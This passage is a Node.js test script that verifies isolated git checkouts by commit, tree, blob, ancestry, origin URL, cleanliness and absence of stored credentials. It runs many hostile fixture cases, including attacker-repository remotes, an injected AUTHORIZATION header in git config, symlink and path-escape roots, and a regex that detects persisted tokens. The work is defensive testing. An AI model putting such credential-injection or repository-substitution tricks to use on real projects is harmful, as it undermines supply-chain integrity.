import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { existsSync, lstatSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {
  AUTHORIZED_BASE, ORIGINAL_CANDIDATE, TRUSTED_RECONCILIATION_BASE,
  AMENDMENT_CONTROLLED_FILES, CANDIDATE_OWNED_FILES, COMPOSED_CI_BASE,
  REQUIRED_CI_ADDITION, composeCandidateCi, composeFinalCi, composeTrustedCi,
  validateDualBaseScope,
} from "./validate-p1a-threat-model.mjs";
import { validateCertificationBundle } from "./validate-p1a-certification-accounting.mjs";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const EXACT_SHA = /^[0-9a-f]{40}$/;
const OFFICIAL_REPOSITORY = "https://github.com/DarksiedCEO/zbestmedia";
const EXPECTED_COMPOSED_CI_BLOB = "9a3f1a04f99e83d9dad84cf384d86117a7d282f1";
const ANCESTRY_CHAIN = Object.freeze([
  AUTHORIZED_BASE,
  "c9c6198e9dc3018bfdbcf98dd3e63335dd2c0e6e",
  "bf3b0478afcab9cb5b58e8af904b98ea53ae3f3e",
  "fec9d68fc142a122c3568a7e8b73e5503081cc28",
  "73227f2bde0f3b70e8a126eaaa16cb1ee0946b71",
  "06545d264030199f87df1558b414aa7f051871cd",
  "f3f2966ec511b64b2d46f38c0363be269bb4246a",
  "36d5b1f2fadddbb60a80f7cac601455c51286240",
  "aa7014e691a6222a0b93e61d6aa2ffa12aa4ced1",
  "e10b602c31b8a3838fdfd76a86b022b7abceb12c",
  ORIGINAL_CANDIDATE,
]);
const PRE_BASE_PARENT = "816c3a7c199e3c6bc4e482435eed60c1fcf0a11c";
const EXPECTED_TREES = Object.freeze({
  original: "d266dafef452c6a327734eec32013c8718fc9371",
  baseline: "06bed4d9f31aa6bf0d65c9adfa3dc2fbb6839d26",
  dualBase: "37345329da7051a818eb2e5b02f1f06f74d667a7",
  evidenceBase: "a929da05a15a0c37644a224697dddec9762b00a0",
});
const authorityRoots = {
  original: process.env.P1A_ORIGINAL_REPOSITORY_ROOT,
  baseline: process.env.P1A_BASELINE_REPOSITORY_ROOT,
  dualBase: process.env.P1A_DUAL_BASE_AUTHORITY_ROOT,
  evidenceBase: process.env.P1A_EVIDENCE_BASE_AUTHORITY_ROOT,
  ancestry: process.env.P1A_ANCESTRY_AUTHORITY_ROOT,
};
const workspaceOptions = (expectedRelative) => process.env.GITHUB_WORKSPACE
  ? { workspaceRoot: process.env.GITHUB_WORKSPACE, expectedRelative }
  : {};
if (process.env.P1A_TRUSTED_EXECUTION_ROOT) {
  assert.equal(
    root,
    path.resolve(process.env.P1A_TRUSTED_EXECUTION_ROOT),
    "dual-base verifier is not executing from trusted checkout",
  );
  assert.ok(process.env.P1A_CANDIDATE_DATA_ROOT, "candidate data root absent");
  assert.notEqual(
    root,
    path.resolve(process.env.P1A_CANDIDATE_DATA_ROOT),
    "candidate root cannot impersonate trusted dual-base checkout",
  );
}
const temporary = mkdtempSync(path.join(tmpdir(), "p1a-dual-base-"));
const repository = path.join(temporary, "repository");
const boundedRepository = path.join(temporary, "bounded-ancestry-repository");
const run = (cwd, args, options = {}) => execFileSync(args[0], args.slice(1), {
  cwd, encoding: "utf8", stdio: ["pipe", "pipe", "pipe"], ...options,
}).trim();
const gitAt = (cwd, ...args) => run(cwd, ["git", ...args]);

const rejects = (operation) => {
  try { operation(); return false; } catch { return true; }
};

function validateBoundedRootInput({ chain, boundary, independentlyVerified, fixtureRoot }) {
  assert.ok(independentlyVerified, "bounded-root: independent chain verification required");
  assert.deepEqual(chain, ANCESTRY_CHAIN, "bounded-root: exact authorized chain required");
  assert.match(boundary, EXACT_SHA, "bounded-root: exact lowercase SHA required");
  assert.equal(boundary, chain[0], "bounded-root: boundary must be first authorized commit");
  assert.equal(path.resolve(fixtureRoot), path.resolve(boundedRepository), "bounded-root: fixture root escaped");
}

function assertPreBaseParentAbsent(fixtureRoot) {
  assert.ok(rejects(() => gitAt(fixtureRoot, "cat-file", "-e", `${PRE_BASE_PARENT}^{commit}`)),
    "bounded-root: pre-base parent silently imported");
}

function verifyBoundedRepository({ chain = ANCESTRY_CHAIN, boundary = AUTHORIZED_BASE,
  independentlyVerified = true, fixtureRoot = boundedRepository, writeBoundary = false } = {}) {
  validateBoundedRootInput({ chain, boundary, independentlyVerified, fixtureRoot });
  const boundedGit = (...args) => gitAt(fixtureRoot, ...args);
  for (let index = 0; index < chain.length; index += 1) {
    const sha = chain[index];
    assert.equal(boundedGit("cat-file", "-t", sha), "commit", "bounded-root: commit absent");
    if (index > 0) {
      const parents = boundedGit("cat-file", "-p", sha).split("\n")
        .filter((line) => line.startsWith("parent ")).map((line) => line.slice(7));
      assert.deepEqual(parents, [chain[index - 1]], "bounded-root: in-scope parent mismatch");
    }
  }
  assertPreBaseParentAbsent(fixtureRoot);
  assert.equal(boundedGit("for-each-ref", "--format=%(refname)", "refs/replace"), "",
    "bounded-root: replace refs forbidden");
  const grafts = path.join(fixtureRoot, ".git/info/grafts");
  assert.ok(!existsSync(grafts), "bounded-root: graft file forbidden");
  const shallowPath = path.resolve(fixtureRoot, boundedGit("rev-parse", "--git-path", "shallow"));
  if (writeBoundary) writeFileSync(shallowPath, `${boundary}\n`, { flag: "w" });
  assert.equal(readFileSync(shallowPath, "utf8"), `${AUTHORIZED_BASE}\n`,
    "bounded-root: shallow metadata must contain the exact sole boundary");
  boundedGit("merge-base", "--is-ancestor", AUTHORIZED_BASE, ORIGINAL_CANDIDATE);
  return { shallowPath, boundedGit };
}

function verifyAuthorityRoot(label, suppliedRoot, expectedSha, expectedTree, expectedBlob, options = {}) {
  assert.ok(suppliedRoot, `${label}: isolated authority root absent`);
  assert.match(expectedSha, EXACT_SHA, `${label}: exact lowercase SHA required`);
  assert.ok(!lstatSync(path.resolve(suppliedRoot)).isSymbolicLink(), `${label}: symlink authority forbidden`);
  const resolved = realpathSync(path.resolve(suppliedRoot));
  assert.notEqual(resolved, realpathSync(root), `${label}: primary candidate checkout forbidden`);
  if (options.workspaceRoot && options.expectedRelative) {
    assert.equal(resolved, realpathSync(path.resolve(options.workspaceRoot, options.expectedRelative)),
      `${label}: candidate-selected or escaping authority root`);
  }
  assert.equal(gitAt(resolved, "rev-parse", "HEAD"), expectedSha, `${label}: wrong HEAD`);
  assert.equal(gitAt(resolved, "cat-file", "-t", expectedSha), "commit", `${label}: object is not commit`);
  assert.equal(gitAt(resolved, "cat-file", "-t", `${expectedSha}^{tree}`), "tree", `${label}: required tree absent`);
  assert.equal(gitAt(resolved, "rev-parse", `${expectedSha}^{tree}`), expectedTree, `${label}: wrong tree`);
  assert.equal(gitAt(resolved, "remote", "get-url", "origin"), OFFICIAL_REPOSITORY, `${label}: wrong repository`);
  assert.equal(gitAt(resolved, "status", "--porcelain=v1"), "", `${label}: authority checkout modified`);
  const config = readFileSync(path.join(resolved, ".git/config"), "utf8");
  assert.ok(!/x-access-token|authorization:|http\..*extraheader/i.test(config), `${label}: persisted credentials detected`);
  if (expectedBlob) {
    assert.equal(
      gitAt(resolved, "rev-parse", `${expectedSha}:.github/workflows/ci.yml`),
      expectedBlob,
      `${label}: required blob mismatch`,
    );
  }
  const gitDirValue = gitAt(resolved, "rev-parse", "--git-dir");
  return {
    root: resolved,
    gitDir: realpathSync(path.isAbsolute(gitDirValue) ? gitDirValue : path.resolve(resolved, gitDirValue)),
  };
}

function verifyAncestryAuthority(suppliedRoot, chain = ANCESTRY_CHAIN, options = {}) {
  assert.ok(suppliedRoot, "ancestry: isolated authority root absent");
  assert.deepEqual(chain, ANCESTRY_CHAIN, "ancestry: exact chain mismatch");
  assert.ok(!lstatSync(path.resolve(suppliedRoot)).isSymbolicLink(), "ancestry: symlink authority forbidden");
  const resolved = realpathSync(path.resolve(suppliedRoot));
  assert.notEqual(resolved, realpathSync(root), "ancestry: primary candidate checkout forbidden");
  if (options.workspaceRoot && options.expectedRelative) {
    assert.equal(resolved, realpathSync(path.resolve(options.workspaceRoot, options.expectedRelative)),
      "ancestry: candidate-selected or escaping authority root");
  }
  assert.equal(gitAt(resolved, "remote", "get-url", "origin"), OFFICIAL_REPOSITORY, "ancestry: wrong repository");
  assert.equal(gitAt(resolved, "status", "--porcelain=v1"), "", "ancestry: authority checkout modified");
  const config = readFileSync(path.join(resolved, ".git/config"), "utf8");
  assert.ok(!/x-access-token|authorization:|http\..*extraheader/i.test(config), "ancestry: persisted credentials detected");
  const actual = gitAt(resolved, "rev-list", "--reverse", ORIGINAL_CANDIDATE).split("\n").filter(Boolean);
  assert.deepEqual(actual, ANCESTRY_CHAIN, "ancestry: incomplete or unrelated history");
  for (let index = 0; index < chain.length; index += 1) {
    const sha = chain[index];
    assert.match(sha, EXACT_SHA, "ancestry: exact lowercase SHA required");
    assert.equal(gitAt(resolved, "cat-file", "-t", sha), "commit", "ancestry: object is not commit");
    const tree = gitAt(resolved, "show", "-s", "--format=%T", sha);
    assert.match(tree, EXACT_SHA, "ancestry: tree identity malformed");
    assert.equal(gitAt(resolved, "cat-file", "-t", tree), "tree", "ancestry: tree absent");
    if (index > 0) {
      const parents = gitAt(resolved, "cat-file", "-p", sha).split("\n")
        .filter((line) => line.startsWith("parent ")).map((line) => line.slice(7));
      assert.deepEqual(parents, [chain[index - 1]], "ancestry: parent linkage mismatch");
    }
  }
  gitAt(resolved, "merge-base", "--is-ancestor", AUTHORIZED_BASE, ORIGINAL_CANDIDATE);
  const gitDirValue = gitAt(resolved, "rev-parse", "--git-dir");
  return { root: resolved, gitDir: realpathSync(path.isAbsolute(gitDirValue) ? gitDirValue : path.resolve(resolved, gitDirValue)) };
}

const verifiedAuthorities = {
  original: verifyAuthorityRoot("original", authorityRoots.original, ORIGINAL_CANDIDATE, EXPECTED_TREES.original,
    undefined, workspaceOptions(".p1a-original-candidate")),
  baseline: verifyAuthorityRoot("baseline", authorityRoots.baseline, COMPOSED_CI_BASE, EXPECTED_TREES.baseline,
    EXPECTED_COMPOSED_CI_BLOB, workspaceOptions(".p1a-trusted-baseline")),
  dualBase: verifyAuthorityRoot("dual-base", authorityRoots.dualBase, TRUSTED_RECONCILIATION_BASE, EXPECTED_TREES.dualBase,
    EXPECTED_COMPOSED_CI_BLOB, workspaceOptions(".p1a-dual-base-authority")),
  evidenceBase: verifyAuthorityRoot("evidence-base", authorityRoots.evidenceBase, AUTHORIZED_BASE, EXPECTED_TREES.evidenceBase,
    "92d0002609c084a280a582b5e1ab39476032ca71", workspaceOptions(".p1a-evidence-base-authority")),
  ancestry: verifyAncestryAuthority(authorityRoots.ancestry, ANCESTRY_CHAIN,
    workspaceOptions(".p1a-ancestry-authority")),
};
assert.equal(new Set(Object.values(verifiedAuthorities).map(({ gitDir }) => gitDir)).size, 5, "authority object stores overlap");
assert.ok(Object.values(verifiedAuthorities).every(({ gitDir }) => !gitDir.startsWith(path.join(root, ".git"))), "primary object store fallback forbidden");

const hostileFixtureRoot = path.join(temporary, "hostile-authority");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", verifiedAuthorities.dualBase.root, hostileFixtureRoot]);
gitAt(hostileFixtureRoot, "remote", "set-url", "origin", OFFICIAL_REPOSITORY);
const wrongRepositoryRoot = path.join(temporary, "wrong-repository");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", verifiedAuthorities.dualBase.root, wrongRepositoryRoot]);
gitAt(wrongRepositoryRoot, "remote", "set-url", "origin", "https://github.com/attacker/zbestmedia");
const credentialRoot = path.join(temporary, "credential-authority");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", verifiedAuthorities.dualBase.root, credentialRoot]);
gitAt(credentialRoot, "remote", "set-url", "origin", OFFICIAL_REPOSITORY);
gitAt(credentialRoot, "config", "http.https://github.com/.extraheader", "AUTHORIZATION: redacted-test-marker");
const modifiedRoot = path.join(temporary, "modified-authority");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", verifiedAuthorities.dualBase.root, modifiedRoot]);
gitAt(modifiedRoot, "remote", "set-url", "origin", OFFICIAL_REPOSITORY);
writeFileSync(path.join(modifiedRoot, "untracked-hostile.txt"), "hostile fixture\n");
const symlinkRoot = path.join(temporary, "symlink-authority");
symlinkSync(verifiedAuthorities.dualBase.root, symlinkRoot);
const evidenceFixtureRoot = path.join(temporary, "evidence-base-authority");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", verifiedAuthorities.evidenceBase.root, evidenceFixtureRoot]);
gitAt(evidenceFixtureRoot, "remote", "set-url", "origin", OFFICIAL_REPOSITORY);
const evidenceWrongRepositoryRoot = path.join(temporary, "evidence-base-wrong-repository");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", verifiedAuthorities.evidenceBase.root, evidenceWrongRepositoryRoot]);
gitAt(evidenceWrongRepositoryRoot, "remote", "set-url", "origin", "https://github.com/attacker/zbestmedia");
const evidenceCredentialRoot = path.join(temporary, "evidence-base-credential");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", verifiedAuthorities.evidenceBase.root, evidenceCredentialRoot]);
gitAt(evidenceCredentialRoot, "remote", "set-url", "origin", OFFICIAL_REPOSITORY);
gitAt(evidenceCredentialRoot, "config", "http.https://github.com/.extraheader", "AUTHORIZATION: redacted-test-marker");
const evidenceModifiedRoot = path.join(temporary, "evidence-base-modified");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", verifiedAuthorities.evidenceBase.root, evidenceModifiedRoot]);
gitAt(evidenceModifiedRoot, "remote", "set-url", "origin", OFFICIAL_REPOSITORY);
writeFileSync(path.join(evidenceModifiedRoot, "untracked-hostile.txt"), "hostile fixture\n");
const evidenceSymlinkRoot = path.join(temporary, "evidence-base-symlink");
symlinkSync(verifiedAuthorities.evidenceBase.root, evidenceSymlinkRoot);
const ancestryWrongRepositoryRoot = path.join(temporary, "ancestry-wrong-repository");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", verifiedAuthorities.ancestry.root, ancestryWrongRepositoryRoot]);
gitAt(ancestryWrongRepositoryRoot, "remote", "set-url", "origin", "https://github.com/attacker/zbestmedia");
const ancestryCredentialRoot = path.join(temporary, "ancestry-credential");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", verifiedAuthorities.ancestry.root, ancestryCredentialRoot]);
gitAt(ancestryCredentialRoot, "remote", "set-url", "origin", OFFICIAL_REPOSITORY);
gitAt(ancestryCredentialRoot, "config", "http.https://github.com/.extraheader", "AUTHORIZATION: redacted-test-marker");
const ancestryModifiedRoot = path.join(temporary, "ancestry-modified");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", verifiedAuthorities.ancestry.root, ancestryModifiedRoot]);
gitAt(ancestryModifiedRoot, "remote", "set-url", "origin", OFFICIAL_REPOSITORY);
writeFileSync(path.join(ancestryModifiedRoot, "untracked-hostile.txt"), "hostile fixture\n");
const ancestrySymlinkRoot = path.join(temporary, "ancestry-symlink");
symlinkSync(verifiedAuthorities.ancestry.root, ancestrySymlinkRoot);
const ancestryIncompleteRoot = path.join(temporary, "ancestry-incomplete");
run(temporary, ["git", "clone", "-q", "--depth", "1", `file://${verifiedAuthorities.ancestry.root}`, ancestryIncompleteRoot]);
gitAt(ancestryIncompleteRoot, "remote", "set-url", "origin", OFFICIAL_REPOSITORY);
const verifyDualBase = (suppliedRoot, sha = TRUSTED_RECONCILIATION_BASE,
  tree = EXPECTED_TREES.dualBase, blob = EXPECTED_COMPOSED_CI_BLOB, options) =>
  verifyAuthorityRoot("dual-base-hostile", suppliedRoot, sha, tree, blob, options);
const verifyEvidenceBase = (suppliedRoot, sha = AUTHORIZED_BASE,
  tree = EXPECTED_TREES.evidenceBase, blob = "92d0002609c084a280a582b5e1ab39476032ca71", options) =>
  verifyAuthorityRoot("evidence-base-hostile", suppliedRoot, sha, tree, blob, options);
const verifyDistinctStores = (...items) => assert.equal(new Set(items.map(({ gitDir }) => gitDir)).size, items.length,
  "authority object stores overlap");
const verifyCleanup = (paths) => {
  for (const item of paths) assert.ok(!existsSync(item), `cleanup omitted or deletion failed: ${item}`);
};
const hostileAuthorityCases = [
  ["missing_isolated_trusted_repository", () => verifyDualBase(undefined)],
  ["wrong_repository", () => verifyDualBase(wrongRepositoryRoot)],
  ["wrong_trusted_sha", () => verifyDualBase(hostileFixtureRoot, "f".repeat(40))],
  ["mutable_branch_substituted", () => verifyDualBase(hostileFixtureRoot, "codex/bt-1")],
  ["mutable_tag_substituted", () => verifyDualBase(hostileFixtureRoot, "v1.0.0")],
  ["abbreviated_sha", () => verifyDualBase(hostileFixtureRoot, TRUSTED_RECONCILIATION_BASE.slice(0, 12))],
  ["malformed_sha", () => verifyDualBase(hostileFixtureRoot, "not-a-sha")],
  ["object_is_not_commit", () => verifyDualBase(hostileFixtureRoot, EXPECTED_COMPOSED_CI_BLOB)],
  ["required_tree_absent", () => verifyDualBase(hostileFixtureRoot, "0".repeat(40))],
  ["wrong_tree", () => verifyDualBase(hostileFixtureRoot, TRUSTED_RECONCILIATION_BASE, "f".repeat(40))],
  ["required_blob_mismatch", () => verifyDualBase(hostileFixtureRoot, TRUSTED_RECONCILIATION_BASE, EXPECTED_TREES.dualBase, "f".repeat(40))],
  ["candidate_repository_as_authority", () => verifyDualBase(root)],
  ["primary_shallow_fallback", () => verifyDualBase(root)],
  ["persisted_credentials", () => verifyDualBase(credentialRoot)],
  ["shared_object_store", () => verifyDistinctStores(verifiedAuthorities.dualBase, verifiedAuthorities.dualBase)],
  ["cleanup_omitted", () => verifyCleanup([hostileFixtureRoot])],
  ["cleanup_deletion_failure", () => verifyCleanup([modifiedRoot])],
  ["candidate_selected_trusted_root", () => verifyDualBase(hostileFixtureRoot, TRUSTED_RECONCILIATION_BASE,
    EXPECTED_TREES.dualBase, EXPECTED_COMPOSED_CI_BLOB,
    { workspaceRoot: temporary, expectedRelative: "expected-authority" })],
  ["environment_path_escape", () => verifyDualBase(hostileFixtureRoot, TRUSTED_RECONCILIATION_BASE,
    EXPECTED_TREES.dualBase, EXPECTED_COMPOSED_CI_BLOB,
    { workspaceRoot: path.join(temporary, "workspace"), expectedRelative: "authority" })],
  ["trusted_checkout_modified", () => verifyDualBase(modifiedRoot)],
  ["symlink_authority", () => verifyDualBase(symlinkRoot)],
];
const evidenceBaseHostileCases = [
  ["missing_root", () => verifyEvidenceBase(undefined)],
  ["wrong_repository", () => verifyEvidenceBase(evidenceWrongRepositoryRoot)],
  ["wrong_sha", () => verifyEvidenceBase(evidenceFixtureRoot, "f".repeat(40))],
  ["mutable_branch", () => verifyEvidenceBase(evidenceFixtureRoot, "codex/bt-1")],
  ["mutable_tag", () => verifyEvidenceBase(evidenceFixtureRoot, "v1.0.0")],
  ["abbreviated_sha", () => verifyEvidenceBase(evidenceFixtureRoot, AUTHORIZED_BASE.slice(0, 12))],
  ["malformed_sha", () => verifyEvidenceBase(evidenceFixtureRoot, "not-a-sha")],
  ["object_not_commit", () => verifyEvidenceBase(evidenceFixtureRoot, "92d0002609c084a280a582b5e1ab39476032ca71")],
  ["missing_object", () => verifyEvidenceBase(evidenceFixtureRoot, "0".repeat(40))],
  ["wrong_tree", () => verifyEvidenceBase(verifiedAuthorities.evidenceBase.root, AUTHORIZED_BASE, "f".repeat(40))],
  ["wrong_blob", () => verifyEvidenceBase(verifiedAuthorities.evidenceBase.root, AUTHORIZED_BASE,
    EXPECTED_TREES.evidenceBase, "f".repeat(40))],
  ["candidate_root", () => verifyEvidenceBase(root)],
  ["primary_store", () => verifyEvidenceBase(root)],
  ["persisted_credentials", () => verifyEvidenceBase(evidenceCredentialRoot)],
  ["shared_store", () => verifyDistinctStores(verifiedAuthorities.evidenceBase, verifiedAuthorities.evidenceBase)],
  ["cleanup_omitted", () => verifyCleanup([verifiedAuthorities.evidenceBase.root])],
  ["candidate_selected_root", () => verifyEvidenceBase(verifiedAuthorities.evidenceBase.root, AUTHORIZED_BASE,
    EXPECTED_TREES.evidenceBase, "92d0002609c084a280a582b5e1ab39476032ca71",
    { workspaceRoot: temporary, expectedRelative: "wrong-root" })],
  ["environment_escape", () => verifyEvidenceBase(verifiedAuthorities.evidenceBase.root, AUTHORIZED_BASE,
    EXPECTED_TREES.evidenceBase, "92d0002609c084a280a582b5e1ab39476032ca71",
    { workspaceRoot: path.join(temporary, "workspace"), expectedRelative: "authority" })],
  ["symlink_root", () => verifyEvidenceBase(evidenceSymlinkRoot)],
  ["wrong_authority_kind", () => verifyEvidenceBase(verifiedAuthorities.dualBase.root)],
  ["wrong_original_kind", () => verifyEvidenceBase(verifiedAuthorities.original.root)],
  ["modified_checkout", () => verifyEvidenceBase(evidenceModifiedRoot)],
  ["uppercase_sha", () => verifyEvidenceBase(verifiedAuthorities.evidenceBase.root, AUTHORIZED_BASE.toUpperCase())],
  ["empty_sha", () => verifyEvidenceBase(verifiedAuthorities.evidenceBase.root, "")],
  ["null_sha", () => verifyEvidenceBase(verifiedAuthorities.evidenceBase.root, null)],
];
const mutateChain = (index, value) => ANCESTRY_CHAIN.map((sha, offset) => offset === index ? value : sha);
const ancestryHostileCases = [
  ["missing_authority", () => verifyAncestryAuthority(undefined)],
  ["missing_intermediate", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root, ANCESTRY_CHAIN.filter((_, index) => index !== 4))],
  ["wrong_intermediate", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root, mutateChain(4, "f".repeat(40)))],
  ["wrong_parent_linkage", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root, mutateChain(5, ANCESTRY_CHAIN[3]))],
  ["reversed_parent_linkage", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root, [...ANCESTRY_CHAIN].reverse())],
  ["mutable_branch", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root, mutateChain(4, "codex/bt-1"))],
  ["mutable_tag", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root, mutateChain(4, "v1.0.0"))],
  ["abbreviated_sha", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root, mutateChain(4, ANCESTRY_CHAIN[4].slice(0, 12)))],
  ["malformed_sha", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root, mutateChain(4, "not-a-sha"))],
  ["wrong_repository", () => verifyAncestryAuthority(ancestryWrongRepositoryRoot)],
  ["tree_substituted", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root, mutateChain(4, EXPECTED_TREES.evidenceBase))],
  ["blob_substituted", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root, mutateChain(4, EXPECTED_COMPOSED_CI_BLOB))],
  ["candidate_checkout", () => verifyAncestryAuthority(root)],
  ["evidence_base_fallback", () => verifyAncestryAuthority(verifiedAuthorities.evidenceBase.root)],
  ["dual_base_fallback", () => verifyAncestryAuthority(verifiedAuthorities.dualBase.root)],
  ["trusted_baseline_fallback", () => verifyAncestryAuthority(verifiedAuthorities.baseline.root)],
  ["shared_object_store", () => verifyDistinctStores(verifiedAuthorities.ancestry, verifiedAuthorities.ancestry)],
  ["persisted_credentials", () => verifyAncestryAuthority(ancestryCredentialRoot)],
  ["candidate_selected_root", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root, ANCESTRY_CHAIN,
    { workspaceRoot: temporary, expectedRelative: "wrong-root" })],
  ["path_escape", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root, ANCESTRY_CHAIN,
    { workspaceRoot: path.join(temporary, "workspace"), expectedRelative: "authority" })],
  ["symlink_authority", () => verifyAncestryAuthority(ancestrySymlinkRoot)],
  ["incomplete_chain_with_endpoints", () => verifyAncestryAuthority(ancestryIncompleteRoot)],
  ["unrelated_commit_inserted", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root,
    [...ANCESTRY_CHAIN.slice(0, 4), TRUSTED_RECONCILIATION_BASE, ...ANCESTRY_CHAIN.slice(4)])],
  ["parent_relation_unverified", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root,
    ANCESTRY_CHAIN.map((sha, index) => index === 1 ? ANCESTRY_CHAIN[2] : sha))],
  ["primary_extra_history_dependency", () => verifyAncestryAuthority(root)],
];
let authorityHostilePassed = 0;
for (const [name, operation] of hostileAuthorityCases) {
  let rejected = false;
  try { operation(); } catch { rejected = true; }
  assert.ok(rejected, `${name}: hostile authority accepted`);
  authorityHostilePassed += 1;
  console.log(`PASS isolated_authority_hostile:${name}`);
}
let evidenceBaseHostilePassed = 0;
for (const [name, operation] of evidenceBaseHostileCases) {
  let rejected = false;
  try { operation(); } catch { rejected = true; }
  assert.ok(rejected, `${name}: hostile evidence-base authority accepted`);
  evidenceBaseHostilePassed += 1;
  console.log(`PASS evidence_base_authority_hostile:${name}`);
}
let ancestryHostilePassed = 0;
for (const [name, operation] of ancestryHostileCases) {
  let rejected = false;
  try { operation(); } catch { rejected = true; }
  assert.ok(rejected, `${name}: hostile ancestry authority accepted`);
  ancestryHostilePassed += 1;
  console.log(`PASS ancestry_authority_hostile:${name}`);
}

const shallowPrimary = path.join(temporary, "shallow-primary");
run(temporary, ["git", "clone", "-q", "--depth", "1", `file://${root}`, shallowPrimary]);
let shallowFailureReproduced = false;
try {
  run(shallowPrimary, ["git", "read-tree", TRUSTED_RECONCILIATION_BASE]);
} catch (error) {
  shallowFailureReproduced = /failed to unpack tree object/.test(error.stderr ?? "");
}
assert.ok(shallowFailureReproduced, "shallow primary checkout did not reproduce missing trusted tree");
console.log("PASS shallow_primary_missing_trusted_tree_reproduced");

run(temporary, ["git", "init", "-q", repository]);
const git = (...args) => run(repository, ["git", ...args]);
git("config", "user.email", "p1a-dual-base@example.invalid");
git("config", "user.name", "P1A dual-base fixture");
git("remote", "add", "origin", `${OFFICIAL_REPOSITORY}.git`);
for (const [name, sha] of [["original", ORIGINAL_CANDIDATE], ["baseline", COMPOSED_CI_BASE], ["dualBase", TRUSTED_RECONCILIATION_BASE], ["evidenceBase", AUTHORIZED_BASE]]) {
  run(repository, ["git", "fetch", "--quiet", "--no-tags", "--no-write-fetch-head", verifiedAuthorities[name].root, sha]);
  assert.equal(git("cat-file", "-t", sha), "commit", `${name}: fixture import failed`);
}
for (const sha of ANCESTRY_CHAIN) {
  run(repository, ["git", "fetch", "--quiet", "--no-tags", "--no-write-fetch-head", verifiedAuthorities.ancestry.root, sha]);
  assert.equal(git("cat-file", "-t", sha), "commit", `ancestry import failed: ${sha}`);
}

// Import only the independently verified in-scope commit objects into a disposable
// object store. The lower boundary is explicit; older business history is neither
// fetched nor treated as part of this proof.
run(temporary, ["git", "init", "-q", boundedRepository]);
const boundedGit = (...args) => gitAt(boundedRepository, ...args);
for (const sha of ANCESTRY_CHAIN) {
  const rawCommit = execFileSync("git", ["cat-file", "commit", sha], {
    cwd: verifiedAuthorities.ancestry.root, stdio: ["pipe", "pipe", "pipe"],
  });
  const importedSha = execFileSync("git", ["hash-object", "-w", "-t", "commit", "--stdin"], {
    cwd: boundedRepository, input: rawCommit, encoding: "utf8", stdio: ["pipe", "pipe", "pipe"],
  }).trim();
  assert.equal(importedSha, sha,
    `bounded ancestry import changed object identity: ${sha}`);
}
assert.ok(rejects(() => boundedGit("cat-file", "-e", `${PRE_BASE_PARENT}^{commit}`)),
  "pre-base parent entered bounded object store");
assert.ok(rejects(() => boundedGit("merge-base", "--is-ancestor", AUTHORIZED_BASE, ORIGINAL_CANDIDATE)),
  "native ancestry unexpectedly succeeded without the bounded root");
console.log("PASS bounded_root_without_boundary_failure_reproduced");
const boundedProof = verifyBoundedRepository({ writeBoundary: true });
console.log("PASS bounded_root_with_boundary_merge_base");
const preBaseImportedRoot = path.join(temporary, "pre-base-imported-hostile");
run(temporary, ["git", "init", "-q", preBaseImportedRoot]);
const rawPreBaseParent = execFileSync("git", ["cat-file", "commit", PRE_BASE_PARENT], {
  cwd: verifiedAuthorities.evidenceBase.root, stdio: ["pipe", "pipe", "pipe"],
});
assert.equal(execFileSync("git", ["hash-object", "-w", "-t", "commit", "--stdin"], {
  cwd: preBaseImportedRoot, input: rawPreBaseParent, encoding: "utf8", stdio: ["pipe", "pipe", "pipe"],
}).trim(), PRE_BASE_PARENT, "hostile pre-base parent fixture identity changed");
const withShallowContent = (content, operation) => {
  const original = readFileSync(boundedProof.shallowPath, "utf8");
  try {
    if (content === null) rmSync(boundedProof.shallowPath, { force: true });
    else writeFileSync(boundedProof.shallowPath, content, { flag: "w" });
    return operation();
  } finally { writeFileSync(boundedProof.shallowPath, original, { flag: "w" }); }
};
const boundedRootHostileCases = [
  ["missing_shallow_boundary", () => withShallowContent(null, () => verifyBoundedRepository())],
  ["wrong_boundary_sha", () => withShallowContent(`${"f".repeat(40)}\n`, () => verifyBoundedRepository())],
  ["candidate_as_boundary", () => verifyBoundedRepository({ boundary: ORIGINAL_CANDIDATE })],
  ["intermediate_as_boundary", () => verifyBoundedRepository({ boundary: ANCESTRY_CHAIN[4] })],
  ["pre_base_parent_as_boundary", () => verifyBoundedRepository({ boundary: PRE_BASE_PARENT })],
  ["multiple_shallow_roots", () => withShallowContent(`${AUTHORIZED_BASE}\n${ORIGINAL_CANDIDATE}\n`, () => verifyBoundedRepository())],
  ["mutable_branch_boundary", () => verifyBoundedRepository({ boundary: "codex/bt-1" })],
  ["mutable_tag_boundary", () => verifyBoundedRepository({ boundary: "v1.0.0" })],
  ["abbreviated_boundary", () => verifyBoundedRepository({ boundary: AUTHORIZED_BASE.slice(0, 12) })],
  ["uppercase_boundary", () => verifyBoundedRepository({ boundary: AUTHORIZED_BASE.toUpperCase() })],
  ["malformed_boundary", () => verifyBoundedRepository({ boundary: "not-a-sha" })],
  ["empty_boundary", () => verifyBoundedRepository({ boundary: "" })],
